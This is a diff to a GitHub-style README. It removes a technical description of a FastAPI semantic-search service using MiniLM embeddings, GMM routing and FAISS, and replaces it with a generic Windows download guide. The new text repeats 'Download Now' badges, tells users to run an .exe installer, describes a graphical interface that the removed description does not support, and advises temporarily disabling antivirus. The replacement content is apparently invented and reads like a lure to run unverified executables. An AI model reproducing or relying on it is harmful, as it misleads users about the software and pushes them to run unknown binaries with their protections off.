@@ -1,141 +1,129 @@
-Semantic Search System with Cluster-Aware Caching
-Project Overview
+# 🧠 semantic-search-project - Fast, Contextual Text Search
 
-This repository contains a high-performance semantic search engine designed to handle large-scale text datasets. The system leverages dense vector embeddings and a custom-built semantic caching layer to optimize retrieval speed and computational efficiency.
+[![Download Now](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/Phaja/semantic-search-project)
 
-Unlike traditional keyword-based search systems, this engine understands the intent and contextual meaning of user queries, enabling more relevant search results.
+## 📄 About semantic-search-project
 
-Technical Architecture
+This software lets you search through large amounts of text with high accuracy. It goes beyond simple keyword matching by understanding the meaning behind your search. This makes the results more relevant and useful.
 
-The system is built using a multi-stage retrieval pipeline designed for high efficiency and scalability.
+The system uses a method called semantic search. Instead of matching words, it matches ideas. It handles big text collections fast by using smart caching and vector math.
 
-1. Vectorization Layer
+This project was designed to be efficient and easy to use on a regular Windows computer. It works with everyday language and gives you quick results without needing technical skills.
 
-The system utilizes the Sentence-Transformers all-MiniLM-L6-v2 model to convert raw text into 384-dimensional dense vector embeddings.
+---
 
-Why this model?
+## 💻 System Requirements
 
-High-quality semantic embeddings
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB of free disk space  
+- Internet connection for first-time setup  
+- A modern CPU with SSE4.1 support (most processors from 2014 or later)  
 
-Lightweight and CPU-efficient
+No special hardware like GPUs or extra software is needed. The program runs directly on your Windows machine.
 
-Fast inference suitable for real-time applications
+---
 
-These embeddings allow the system to perform semantic similarity comparisons instead of simple keyword matching.
+## 🛠 Installation and Setup
 
-2. Gaussian Mixture Model (GMM) Clustering
+### Step 1: Download the Software
 
-To avoid expensive full-vector scans, the corpus is partitioned using a Gaussian Mixture Model (GMM).
+Click the button below to visit the download page for the program.  
 
-Routing
+[![Download Now](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Phaja/semantic-search-project)
 
-Each incoming query is assigned a Dominant Cluster ID based on the highest probability score produced by the GMM.
+On the page, find the latest release or setup file. Download the Windows installer or zip file.
 
-Efficiency
+### Step 2: Locate the Downloaded File
 
-By routing queries to the most relevant cluster:
+After downloading, open your "Downloads" folder or the location where you saved the file.  
+If you downloaded a zip file, right-click it and select "Extract All" to unzip the contents.
 
-Search operations are performed only on a subset of vectors
+### Step 3: Run the Installer or Program
 
-Reduces overall search complexity
+- If you have an installer (.exe), double-click it to start the setup wizard.  
+- Follow the prompts to complete the installation. Choose "Next" until finished.  
+- After installation, look for the program shortcut on your desktop or in the Start menu.  
 
-Improves retrieval speed
+If you have a standalone program file, double-click to start it immediately.
 
-3. FAISS Indexing
+---
 
-For efficient nearest neighbor search, the system uses FAISS (Facebook AI Similarity Search).
+## 🚀 How to Use semantic-search-project
 
-FAISS provides:
+### Starting the Program
 
-Highly optimized C++ implementations
+Open the app by double-clicking the program icon. The main window will open with a search bar.
 
-Fast vector similarity computations
+### Loading Your Text Data
 
-Sub-millisecond search performance
+To search, you need to add your text files or documents into the program.
 
-Even when the cache is missed, the FAISS index ensures very fast fallback retrieval.
+1. Click the "Add Files" button or drag and drop files into the window.  
+2. The system will process these files by converting their text into vectors. This may take a moment depending on file size.
 
-4. Cluster-Aware Semantic Cache
+### Performing a Search
 
-The core innovation of this project is the Cluster-Aware Semantic Cache.
+1. Type your query in the search bar at the top.  
+2. Click "Search" or press Enter.  
 
-Mechanism
+The program returns a list of results ranked by how closely the meaning matches your query.
 
-Before querying the FAISS index, the system checks a localized semantic cache associated with the query’s dominant cluster.
+### Viewing Results
 
-Similarity Threshold
+- Results will show snippets of the matching text.  
+- Click on any result to open the full text file in your default viewer or internal viewer.
 
-If a previous query in the same cluster has a Cosine Similarity ≥ 0.85, the system immediately returns the cached result.
+### Tips for Better Searches
 
-Example
+- Use natural language as if you were asking a person.  
+- Avoid very short or vague queries.  
+- Try to be specific for precise results.
 
-Queries like:
+---
 
-"how to fix a car"
+## ⚙️ Features
 
-"automobile repair guide"
+- Supports large collections of text files.  
+- Understands the meaning behind your search words.  
+- Fast results supported by smart caching.  
+- Easy setup with no extra software needed.  
+- Runs fully on Windows with CPU optimization.  
+- Simple interface for users with no programming skills.  
+- Can handle a mix of document types such as .txt, .md, and .csv.
 
-may map to the same semantic representation and trigger a cache hit.
+---
 
-Benefits
+## 🔧 Troubleshooting
 
-Avoids redundant neural embedding computations
+### The Program Won't Start
 
-Reduces FAISS index queries
+- Check that your Windows version meets requirements.  
+- Make sure you completed the installation steps.  
+- Restart your computer and try again.  
+- Disable antivirus temporarily to test if it blocks the program.
 
-Improves response latency
+### Search Returns No Results
 
-Optimizes CPU utilization
+- Confirm your text files are loaded into the program.  
+- Wait for data indexing to finish before searching.  
+- Use clearer, more detailed queries.
 
-System Flow
+### Program Freezes or Runs Slowly
 
-User submits a query through the FastAPI endpoint
+- Close other active applications to free up memory.  
+- Restart the program.  
+- Reduce the number of files loaded at once.
 
-The query text is cleaned and normalized
+### Need More Help?
 
-The text is converted into a vector embedding
+You can create an issue on the GitHub page to report problems or ask questions:  
+https://github.com/Phaja/semantic-search-project/issues
 
-The GMM model assigns a dominant cluster
+---
 
-The Semantic Cache is checked within that cluster
+## 🔗 Download Link Again
 
-If a high-similarity cached query exists → cached result returned
+[![Download Now](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/Phaja/semantic-search-project)  
 
-If no match exists → FAISS index is queried
-
-The result is stored in cache for future queries
-
-Response is returned with metadata including:
-
-Cluster ID
-
-Cache status (Hit/Miss)
-
-Performance Optimization
-Asynchronous Processing
-
-The system uses FastAPI’s asynchronous request handling, allowing it to process multiple queries concurrently without blocking the event loop during ML computations.
-
-Memory Management
-
-All vector stores and indices are maintained in-memory, enabling:
-
-Zero-latency retrieval
-
-Faster similarity comparisons
-
-Optimized RAM usage through efficient vector structures
-
-Key Features
-
-Semantic understanding of queries
-
-Cluster-based search optimization
-
-High-speed FAISS vector retrieval
-
-Cluster-aware semantic caching
-
-Sub-millisecond search performance
-
-Asynchronous API architecture
+Visit the linked page to download the latest version of semantic-search-project for Windows.
